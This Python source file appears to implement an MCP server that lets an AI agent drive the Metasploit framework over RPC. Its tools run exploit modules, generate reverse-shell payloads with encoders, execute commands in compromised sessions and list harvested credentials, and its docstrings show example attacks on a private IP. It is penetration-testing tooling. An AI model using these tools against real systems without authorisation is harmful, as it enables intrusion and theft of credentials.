"""MCP server implementation for pymetasploit3."""

from typing import Any

import fastmcp
from pymetasploit3.msfrpc import MsfAuthError, MsfRpcClient

msf_mcp = fastmcp.FastMCP("mcp-pymetasploit3")

_client: MsfRpcClient | None = None


def _get_client() -> MsfRpcClient:
    """Get the current client or raise an error."""
    if _client is None:
        raise RuntimeError("Not connected. Call connect() first.")
    return _client


@msf_mcp.tool()
def connect(
    password: str,
    host: str = "127.0.0.1",
    port: int = 55553,
    ssl: bool = False,
    username: str = "msf",
) -> dict[str, Any]:
    """Connect to Metasploit RPC server.

    Args:
        password: The password for authentication.
        host: The RPC server hostname (default: 127.0.0.1).
        port: The RPC server port (default: 55553).
        ssl: Use SSL for connection (default: False).
        username: The username for authentication (default: msf).

    Returns:
        Connection status including authenticated state and server info.

    Example:
        >>> connect("mypassword", "192.168.1.100", 55553, True)
        {"status": "connected", "authenticated": True, "host": "192.168.1.100", "port": 55553}
    """
    global _client
    try:
        _client = MsfRpcClient(
            password,
            host=host,
            port=port,
            ssl=ssl,
            username=username,
        )
        return {
            "status": "connected",
            "authenticated": _client.authenticated,
            "host": host,
            "port": port,
            "ssl": ssl,
        }
    except MsfAuthError as e:
        raise RuntimeError(f"Authentication failed: {e}")
    except Exception as e:
        raise RuntimeError(f"Connection failed: {e}")


@msf_mcp.tool()
def disconnect() -> dict[str, str]:
    """Disconnect from Metasploit RPC server.

    Returns:
        Disconnection status.

    Example:
        >>> disconnect()
        {"status": "disconnected"}
    """
    global _client
    if _client is not None:
        _client.logout()
        _client = None
    return {"status": "disconnected"}


@msf_mcp.tool()
def get_client_info() -> dict[str, Any]:
    """Get current connection status and information.

    Returns:
        Current connection details including authentication state.

    Example:
        >>> get_client_info()
        {"connected": True, "authenticated": True, "host": "127.0.0.1", "port": 55553}
    """
    if _client is None:
        return {"connected": False, "authenticated": False}
    return {
        "connected": True,
        "authenticated": _client.authenticated,
        "host": _client.host,
        "port": _client.port,
        "ssl": _client.ssl,
    }


@msf_mcp.tool()
def list_modules(module_type: str) -> list[str]:
    """List available modules of a specific type.

    Args:
        module_type: The type of module (exploit, auxiliary, payload, post, encoder, nop, evasion).

    Returns:
        List of available module names.

    Example:
        >>> list_modules("exploit")
        ["windows/smb/ms17_010_psexec", "unix/ftp/vsftpd_234_backdoor", ...]
    """
    client = _get_client()
    module_types = {
        "exploit": client.modules.exploits,
        "auxiliary": client.modules.auxiliary,
        "payload": client.modules.payloads,
        "post": client.modules.post,
        "encoder": client.modules.encoders,
        "nop": client.modules.nops,
        "evasion": client.modules.evasion,
    }
    if module_type not in module_types:
        raise ValueError(
            f"Invalid module type: {module_type}. Use: {list(module_types.keys())}"
        )
    return module_types[module_type]


@msf_mcp.tool()
def use_module(module_type: str, module_name: str) -> dict[str, Any]:
    """Load a specific module for use.

    Args:
        module_type: The type of module (exploit, auxiliary, payload, post, encoder, nop).
        module_name: The full module name (e.g., 'unix/ftp/vsftpd_234_backdoor').

    Returns:
        Module information including description, options, and references.

    Example:
        >>> use_module("exploit", "unix/ftp/vsftpd_234_backdoor")
        {"status": "loaded", "type": "exploit", "name": "unix/ftp/vsftpd_234_backdoor", ...}
    """
    client = _get_client()
    module = client.modules.use(module_type, module_name)
    return {
        "status": "loaded",
        "type": module_type,
        "name": module_name,
        "description": getattr(module, "description", ""),
        "options": module.options,
        "required": module.required,
    }


@msf_mcp.tool()
def get_module_info(module_type: str, module_name: str) -> dict[str, Any]:
    """Get detailed information about a module.

    Args:
        module_type: The type of module.
        module_name: The module name.

    Returns:
        Detailed module information including description, author, references.

    Example:
        >>> get_module_info("exploit", "unix/ftp/vsftpd_234_backdoor")
        {"description": "...", "author": [...], "references": [...], ...}
    """
    client = _get_client()
    module = client.modules.use(module_type, module_name)
    return module.info


@msf_mcp.tool()
def get_module_options(module_type: str, module_name: str) -> dict[str, Any]:
    """Get all options for a module.

    Args:
        module_type: The type of module.
        module_name: The module name.

    Returns:
        Dictionary of module options with their properties.

    Example:
        >>> get_module_options("exploit", "unix/ftp/vsftpd_234_backdoor")
        {"RHOSTS": {"type": "addressrange", "required": True, ...}, ...}
    """
    client = _get_client()
    module = client.modules.use(module_type, module_name)
    return module._moptions


@msf_mcp.tool()
def set_module_option(
    module_type: str, module_name: str, option: str, value: Any
) -> dict[str, Any]:
    """Set a module option value.

    Args:
        module_type: The type of module.
        module_name: The module name.
        option: The option name to set.
        value: The value to set.

    Returns:
        Status and current runoptions.

    Example:
        >>> set_module_option("exploit", "unix/ftp/vsftpd_234_backdoor", "RHOSTS", "192.168.1.100")
        {"status": "set", "option": "RHOSTS", "value": "192.168.1.100"}
    """
    module = _get_client().modules.use(module_type, module_name)
    module[option] = value
    return {"status": "set", "option": option, "value": value}


@msf_mcp.tool()
def get_missing_required(module_type: str, module_name: str) -> list[str]:
    """Get required options that haven't been set yet.

    Args:
        module_type: The type of module.
        module_name: The module name.

    Returns:
        List of missing required options.

    Example:
        >>> get_missing_required("exploit", "unix/ftp/vsftpd_234_backdoor")
        ["RHOSTS"]
    """
    module = _get_client().modules.use(module_type, module_name)
    return module.missing_required


@msf_mcp.tool()
def execute_module(
    module_type: str,
    module_name: str,
    payload: str | None = None,
    rhosts: str | None = None,
    rport: int | None = None,
    lhost: str | None = None,
    lport: int | None = None,
    verbose: bool | None = None,
) -> dict[str, Any]:
    """Execute a loaded module.

    Args:
        module_type: The type of module.
        module_name: The module name.
        payload: Optional payload to use (for exploits).
        rhosts: Remote target host(s).
        rport: Remote target port.
        lhost: Local host for payload callback.
        lport: Local port for payload callback.
        verbose: Enable verbose output.

    Returns:
        Execution result including job_id and uuid.

    Example:
        >>> execute_module("exploit", "unix/ftp/vsftpd_234_backdoor", payload="cmd/unix/interact", rhosts="192.168.1.100")
        {"job_id": 1, "uuid": "abc123"}
    """
    module = _get_client().modules.use(module_type, module_name)
    if rhosts is not None:
        module["RHOSTS"] = rhosts
    if rport is not None:
        module["RPORT"] = rport
    if lhost is not None:
        module["LHOST"] = lhost
    if lport is not None:
        module["LPORT"] = lport
    if verbose is not None:
        module["VERBOSE"] = verbose

    result = module.execute(payload=payload) if payload else module.execute()
    return result


@msf_mcp.tool()
def get_module_targets(module_type: str, module_name: str) -> dict[int, str]:
    """Get available targets for a module.

    Args:
        module_type: The type of module.
        module_name: The module name.

    Returns:
        Dictionary of target ID to target name.

    Example:
        >>> get_module_targets("exploit", "windows/smb/ms17_010_psexec")
        {0: "Automatic", 1: "Windows XP SP3 (x86)", ...}
    """
    module = _get_client().modules.use(module_type, module_name)
    return module.targets


@msf_mcp.tool()
def set_module_target(
    module_type: str, module_name: str, target: int
) -> dict[str, Any]:
    """Set the target for a module.

    Args:
        module_type: The type of module.
        module_name: The module name.
        target: The target ID to set.

    Returns:
        Status and selected target.

    Example:
        >>> set_module_target("exploit", "windows/smb/ms17_010_psexec", 1)
        {"status": "set", "target": 1}
    """
    module = _get_client().modules.use(module_type, module_name)
    module.target = target
    return {"status": "set", "target": target}


@msf_mcp.tool()
def get_target_payloads(
    module_type: str, module_name: str, target: int = 0
) -> list[str]:
    """Get compatible payloads for a target.

    Args:
        module_type: The type of module (exploit).
        module_name: The module name.
        target: The target ID (default: 0).

    Returns:
        List of compatible payload names.

    Example:
        >>> get_target_payloads("exploit", "unix/ftp/vsftpd_234_backdoor", 0)
        ["cmd/unix/interact"]
    """
    module = _get_client().modules.use(module_type, module_name)
    return module.targetpayloads(target)


@msf_mcp.tool()
def generate_payload(
    payload_name: str,
    lhost: str | None = None,
    lport: int | None = None,
    format: str | None = None,
    encoder: str | None = None,
    badchars: str | None = None,
    iterations: int | None = None,
) -> dict[str, Any]:
    """Generate a payload with the specified options.

    Args:
        payload_name: The payload module name (e.g., 'windows/meterpreter/reverse_tcp').
        lhost: Local host for reverse connections.
        lport: Local port for reverse connections.
        format: Output format (exe, raw, python, etc.).
        encoder: Encoder module to use.
        badchars: Characters to avoid in payload.
        iterations: Number of encoding iterations.

    Returns:
        Generated payload data (as base64 string if binary).

    Example:
        >>> generate_payload("windows/meterpreter/reverse_tcp", lhost="192.168.1.100", lport=4444)
        {"payload": "base64encoded...", "format": "exe"}
    """
    client = _get_client()
    payload = client.modules.use("payload", payload_name)

    if lhost is not None:
        payload["LHOST"] = lhost
    if lport is not None:
        payload["LPORT"] = lport
    if format is not None:
        payload["Format"] = format
    if encoder is not None:
        payload["Encoder"] = encoder
    if badchars is not None:
        payload["BadChars"] = badchars
    if iterations is not None:
        payload["Iterations"] = iterations

    data = payload.payload_generate()
    if isinstance(data, bytes):
        import base64

        return {
            "payload": base64.b64encode(data).decode(),
            "format": format or "raw",
        }
    return {"payload": data, "format": "raw"}


@msf_mcp.tool()
def list_sessions() -> dict[str, Any]:
    """List all active sessions.

    Returns:
        Dictionary of session IDs to session information.

    Example:
        >>> list_sessions()
        {"1": {"type": "meterpreter", "session_host": "192.168.1.100", ...}, ...}
    """
    return _get_client().sessions.list


@msf_mcp.tool()
def get_session_info(session_id: str) -> dict[str, Any]:
    """Get information about a specific session.

    Args:
        session_id: The session ID to query.

    Returns:
        Session information including type, tunnel, platform, etc.

    Example:
        >>> get_session_info("1")
        {"type": "meterpreter", "session_host": "192.168.1.100", ...}
    """
    client = _get_client()
    sessions = client.sessions.list
    if session_id not in sessions:
        raise ValueError(f"Session {session_id} not found")
    return sessions[session_id]


@msf_mcp.tool()
def interact_session(session_id: str, command: str) -> dict[str, Any]:
    """Write a command to a session and read the output.

    Args:
        session_id: The session ID to interact with.
        command: The command to execute.

    Returns:
        Command output from the session.

    Example:
        >>> interact_session("1", "whoami")
        {"output": "root"}
    """
    session = _get_client().sessions.session(session_id)
    session.write(command)
    import time

    time.sleep(1)
    return {"output": session.read()}


@msf_mcp.tool()
def session_run_command(
    session_id: str,
    command: str,
    terminating_strings: list[str] | None = None,
    timeout: int = 300,
    timeout_exception: bool = True,
) -> dict[str, Any]:
    """Run a command in a session and wait for output.

    Args:
        session_id: The session ID to run the command in.
        command: The command to execute.
        terminating_strings: Strings that indicate command completion.
        timeout: Timeout in seconds (default: 300).
        timeout_exception: Raise exception on timeout (default: True).

    Returns:
        Command output.

    Example:
        >>> session_run_command("1", "arp", terminating_strings=["---"])
        {"output": "\\nARP Table\\n---------------"}
    """
    session = _get_client().sessions.session(session_id)
    if terminating_strings:
        result = session.run_with_output(
            command,
            terminating_strings,
            timeout=timeout,
            timeout_exception=timeout_exception,
        )
    else:
        result = session.run_shell_cmd_with_output(command, timeout=timeout)
    return {"output": result}


@msf_mcp.tool()
def stop_session(session_id: str) -> dict[str, str]:
    """Stop/close a session.

    Args:
        session_id: The session ID to stop.

    Returns:
        Status of the operation.

    Example:
        >>> stop_session("1")
        {"status": "stopped"}
    """
    _get_client().sessions.session(session_id).stop()
    return {"status": "stopped"}


@msf_mcp.tool()
def create_console() -> dict[str, Any]:
    """Create a new Metasploit console.

    Returns:
        Console information including console ID.

    Example:
        >>> create_console()
        {"cid": "1", "prompt": "msf6 > "}
    """
    console = _get_client().consoles.console()
    return {"cid": console.cid, "prompt": console.read().get("prompt", "")}


@msf_mcp.tool()
def destroy_console(console_id: str) -> dict[str, str]:
    """Destroy a Metasploit console.

    Args:
        console_id: The console ID to destroy.

    Returns:
        Status of the operation.

    Example:
        >>> destroy_console("1")
        {"status": "destroyed"}
    """
    _get_client().consoles.console(console_id).destroy()
    return {"status": "destroyed"}


@msf_mcp.tool()
def write_console(console_id: str, command: str) -> dict[str, Any]:
    """Write a command to a console.

    Args:
        console_id: The console ID.
        command: The command to execute.

    Returns:
        Console read result.

    Example:
        >>> write_console("1", "show options")
        {"data": "...", "prompt": "msf6 > "}
    """
    console = _get_client().consoles.console(console_id)
    console.write(command)
    return {"status": "written"}


@msf_mcp.tool()
def read_console(console_id: str) -> dict[str, Any]:
    """Read output from a console.

    Args:
        console_id: The console ID.

    Returns:
        Console output including data and prompt.

    Example:
        >>> read_console("1")
        {"data": "...", "prompt": "msf6 > ", "busy": False}
    """
    return _get_client().consoles.console(console_id).read()


@msf_mcp.tool()
def console_is_busy(console_id: str) -> dict[str, bool]:
    """Check if a console is currently executing.

    Args:
        console_id: The console ID.

    Returns:
        Whether the console is busy.

    Example:
        >>> console_is_busy("1")
        {"busy": False}
    """
    return {"busy": _get_client().consoles.console(console_id).is_busy()}


@msf_mcp.tool()
def run_module_output(
    module_type: str,
    module_name: str,
    payload: str | None = None,
    rhosts: str | None = None,
    rport: int | None = None,
    lhost: str | None = None,
    lport: int | None = None,
) -> dict[str, Any]:
    """Execute a module and return the output.

    Args:
        module_type: The type of module.
        module_name: The module name.
        payload: Optional payload to use.
        rhosts: Remote target host(s).
        rport: Remote target port.
        lhost: Local host for payload callback.
        lport: Local port for payload callback.

    Returns:
        Module execution output.

    Example:
        >>> run_module_output("exploit", "unix/ftp/vsftpd_234_backdoor", payload="cmd/unix/interact", rhosts="192.168.1.100")
        {"output": "[*] 192.168.1.100:21 - Banner: 220 vsFTPd..."}
    """
    client = _get_client()
    module = client.modules.use(module_type, module_name)
    if rhosts is not None:
        module["RHOSTS"] = rhosts
    if rport is not None:
        module["RPORT"] = rport
    if lhost is not None:
        module["LHOST"] = lhost
    if lport is not None:
        module["LPORT"] = lport

    cid = client.consoles.console().cid
    result = client.consoles.console(cid).run_module_with_output(
        module, payload=payload
    )
    return {"output": result}


@msf_mcp.tool()
def get_framework_version() -> dict[str, Any]:
    """Get Metasploit framework version information.

    Returns:
        Version information including version, api, framework, etc.

    Example:
        >>> get_framework_version()
        {"version": "6.4.0", "api": "1.0", "msf": "6.4.0-dev"}
    """
    return _get_client().core.version


@msf_mcp.tool()
def get_db_status() -> dict[str, Any]:
    """Get database connection status.

    Returns:
        Database status information.

    Example:
        >>> get_db_status()
        {"driver": "postgresql", "connected": True}
    """
    return _get_client().db.status


@msf_mcp.tool()
def list_jobs() -> dict[str, Any]:
    """List all running jobs.

    Returns:
        Dictionary of job IDs to job information.

    Example:
        >>> list_jobs()
        {"0": {"name": "Exploit: unix/ftp/vsftpd_234_backdoor", ...}}
    """
    return _get_client().jobs.list


@msf_mcp.tool()
def stop_job(job_id: str) -> dict[str, str]:
    """Stop a running job.

    Args:
        job_id: The job ID to stop.

    Returns:
        Status of the operation.

    Example:
        >>> stop_job("0")
        {"status": "stopped"}
    """
    _get_client().jobs.stop(job_id)
    return {"status": "stopped"}


@msf_mcp.tool()
def get_job_info(job_id: str) -> dict[str, Any]:
    """Get information about a specific job.

    Args:
        job_id: The job ID.

    Returns:
        Job information.

    Example:
        >>> get_job_info("0")
        {"name": "Exploit: unix/ftp/vsftpd_234_backdoor", ...}
    """
    return _get_client().jobs.info(job_id)


@msf_mcp.tool()
def list_plugins() -> list[str]:
    """List currently loaded plugins.

    Returns:
        List of loaded plugin names.

    Example:
        >>> list_plugins()
        ["db_connector", "socket_logger"]
    """
    return _get_client().plugins.list


@msf_mcp.tool()
def load_plugin(plugin_name: str) -> dict[str, str]:
    """Load a Metasploit plugin.

    Args:
        plugin_name: The name of the plugin to load.

    Returns:
        Status of the operation.

    Example:
        >>> load_plugin("db_connector")
        {"status": "loaded"}
    """
    _get_client().plugins.load(plugin_name)
    return {"status": "loaded"}


@msf_mcp.tool()
def unload_plugin(plugin_name: str) -> dict[str, str]:
    """Unload a Metasploit plugin.

    Args:
        plugin_name: The name of the plugin to unload.

    Returns:
        Status of the operation.

    Example:
        >>> unload_plugin("db_connector")
        {"status": "unloaded"}
    """
    _get_client().plugins.unload(plugin_name)
    return {"status": "unloaded"}


@msf_mcp.tool()
def db_list_workspaces() -> list[dict[str, Any]]:
    """List all workspaces.

    Returns:
        List of workspace information.

    Example:
        >>> db_list_workspaces()
        [{"name": "default", "id": 1}, {"name": "project1", "id": 2}]
    """
    return _get_client().db.workspaces.list


@msf_mcp.tool()
def db_set_workspace(workspace_name: str) -> dict[str, str]:
    """Set the current workspace.

    Args:
        workspace_name: The name of the workspace to set as current.

    Returns:
        Status of the operation.

    Example:
        >>> db_set_workspace("project1")
        {"status": "set", "workspace": "project1"}
    """
    _get_client().db.workspaces.set(workspace_name)
    return {"status": "set", "workspace": workspace_name}


@msf_mcp.tool()
def db_list_hosts() -> list[dict[str, Any]]:
    """List all hosts in the current workspace.

    Returns:
        List of host information.

    Example:
        >>> db_list_hosts()
        [{"host": "192.168.1.100", "state": "alive", ...}]
    """
    return _get_client().db.workspace.hosts.list


@msf_mcp.tool()
def db_list_services() -> list[dict[str, Any]]:
    """List all services in the current workspace.

    Returns:
        List of service information.

    Example:
        >>> db_list_services()
        [{"host": "192.168.1.100", "port": 22, "name": "ssh", ...}]
    """
    return _get_client().db.workspace.services.list


@msf_mcp.tool()
def db_list_notes() -> list[dict[str, Any]]:
    """List all notes in the current workspace.

    Returns:
        List of note information.

    Example:
        >>> db_list_notes()
        [{"host": "192.168.1.100", "type": "smb_peer_os", ...}]
    """
    return _get_client().db.workspace.notes.list


@msf_mcp.tool()
def db_list_creds() -> list[dict[str, Any]]:
    """List all credentials in the current workspace.

    Returns:
        List of credential information.

    Example:
        >>> db_list_creds()
        [{"host": "192.168.1.100", "user": "admin", ...}]
    """
    return _get_client().db.workspace.creds.list


@msf_mcp.tool()
def db_list_vulns() -> list[dict[str, Any]]:
    """List all vulnerabilities in the current workspace.

    Returns:
        List of vulnerability information.

    Example:
        >>> db_list_vulns()
        [{"host": "192.168.1.100", "name": "vsftpd_234_backdoor", ...}]
    """
    return _get_client().db.workspace.vulns.list


@msf_mcp.tool()
def core_save() -> dict[str, str]:
    """Save the current core state.

    Returns:
        Status of the operation.

    Example:
        >>> core_save()
        {"status": "saved"}
    """
    _get_client().core.save()
    return {"status": "saved"}


@msf_mcp.tool()
def core_reload_modules() -> dict[str, str]:
    """Reload all modules in the framework.

    Returns:
        Status of the operation.

    Example:
        >>> core_reload_modules()
        {"status": "reloaded"}
    """
    _get_client().core.reload()
    return {"status": "reloaded"}


@msf_mcp.tool()
def core_set_global(var: str, value: str) -> dict[str, Any]:
    """Set a global variable.

    Args:
        var: The variable name.
        value: The variable value.

    Returns:
        Status of the operation.

    Example:
        >>> core_set_global("LHOST", "192.168.1.100")
        {"status": "set", "var": "LHOST", "value": "192.168.1.100"}
    """
    _get_client().core.setg(var, value)
    return {"status": "set", "var": var, "value": value}


@msf_mcp.tool()
def core_unset_global(var: str) -> dict[str, str]:
    """Unset a global variable.

    Args:
        var: The variable name to unset.

    Returns:
        Status of the operation.

    Example:
        >>> core_unset_global("LHOST")
        {"status": "unset", "var": "LHOST"}
    """
    _get_client().core.unsetg(var)
    return {"status": "unset", "var": var}


@msf_mcp.tool()
def search_modules(query: str) -> list[dict[str, str]]:
    """Search for modules matching a query.

    Args:
        query: The search query string.

    Returns:
        List of matching modules with their types.

    Example:
        >>> search_modules("smb")
        [{"type": "exploit", "name": "windows/smb/ms17_010_psexec"}, ...]
    """
    results = _get_client().modules.search(query)
    return results


@msf_mcp.tool()
def get_module_references(module_type: str, module_name: str) -> list[list[str]]:
    """Get CVE/OSVDB/BID references for a module.

    Args:
        module_type: The type of module.
        module_name: The module name.

    Returns:
        List of references (type, value pairs).

    Example:
        >>> get_module_references("exploit", "windows/smb/ms17_010_psexec")
        [["CVE", "2017-0143"], ["MS", "MS17-010"]]
    """
    module = _get_client().modules.use(module_type, module_name)
    return module.references


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == "--help":
        print("Usage: mcp-pymetasploit3")
        print(
            "This MCP server requires the environment variables or direct parameters to connect."
        )
        print("Use the connect() tool to connect to a Metasploit RPC server.")
    msf_mcp.run()
